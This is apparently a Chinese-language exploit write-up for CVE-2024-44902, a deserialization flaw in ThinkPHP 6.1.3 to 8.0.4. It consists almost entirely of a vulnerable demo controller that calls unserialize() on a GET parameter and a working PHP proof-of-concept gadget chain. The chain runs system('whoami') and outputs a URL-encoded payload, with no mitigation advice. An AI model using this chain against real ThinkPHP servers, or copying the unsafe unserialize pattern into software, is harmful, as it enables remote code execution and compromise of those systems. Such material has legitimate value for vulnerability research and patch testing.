# thinkphp最新CVE-2024-44902反序列化漏洞

Thinkphp v6.1.3 至 v8.0.4 中存在反序列化漏洞，允许攻击者执行任意代码。

## demo

```php
<?php

namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        unserialize($_GET['x']);
        return '<style>*{ padding: 0; margin: 0; }</style><iframe src="https://www.thinkphp.cn/welcome?version=' . \think\facade\App::version() . '" width="100%" height="100%" frameborder="0" scrolling="auto"></iframe>';
    }

    public function hello($name = 'ThinkPHP8')
    {
        return 'hello,' . $name;
    }
}

```

## poc

```php
<?php
namespace think\cache\driver;
use think\model\Pivot;
class Memcached{
    protected $options=[];
    function __construct()
    {
        $this->options["username"]=new Pivot();
    }
}

namespace think\model;
use think\model;
class Pivot extends Model
{

}

namespace think;
abstract class Model{
    private $data = [];
    private $withAttr = [];
    protected $json = [];
    protected $jsonAssoc = true;
    function __construct()
    {
        $this->data["fru1ts"]=["whoami"];
        $this->withAttr["fru1ts"]=["system"];
        $this->json=["fru1ts"];
    }
}

namespace think\route;
use think\DbManager;
class ResourceRegister
{
    protected $registered = false;
    protected $resource;
    function __construct()
    {
        $this->registered=false;
        $this->resource=new DbManager();
    }
}
namespace think;
use think\model\Pivot;
class DbManager
{
    protected $instance = [];
    protected $config = [];
    function __construct()
    {
        $this->config["connections"]=["getRule"=>["type"=>"\\think\\cache\\driver\\Memcached","username"=>new Pivot()]];
        $this->config["default"]="getRule";
    }
}

use think\route\ResourceRegister;
$r=new ResourceRegister();
echo urlencode(serialize($r));

```

![image-20240916205334112](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409162053192.png)



## 漏洞来源

- https://github.com/fru1ts/CVE-2024-44902
- https://xz.aliyun.com/t/15582